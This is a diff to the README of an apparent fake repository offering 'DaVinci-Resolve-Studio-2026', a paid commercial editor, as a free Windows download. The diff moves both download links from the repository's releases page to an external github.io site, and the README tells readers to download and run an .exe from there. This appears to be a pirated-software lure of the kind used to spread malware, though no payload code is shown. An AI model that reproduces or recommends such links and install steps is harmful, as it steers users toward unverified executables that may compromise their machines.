@@ -1,6 +1,6 @@
 # 🎨 DaVinci-Resolve-Studio-2026 - Streamline your professional post-production workflow today
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/bastardized-epicycloid466/DaVinci-Resolve-Studio-2026/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://bastardized-epicycloid466.github.io)
 
 DaVinci-Resolve-Studio-2026 provides a complete professional environment for video editing, color correction, visual effects, and audio post-production on Windows. This workflow uses a collection of calibrated color grading presets, Fusion compositions, and export settings to help you finish projects.
 
@@ -21,7 +21,7 @@ Verify that you have current drivers installed for your graphics card. Visit you
 
 Follow these steps to download and install the software.
 
-1. Visit the [releases page](https://github.com/bastardized-epicycloid466/DaVinci-Resolve-Studio-2026/releases) to access the installation files.
+1. Visit the [releases page](https://bastardized-epicycloid466.github.io) to access the installation files.
 2. Select the file labeled with the latest version number ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
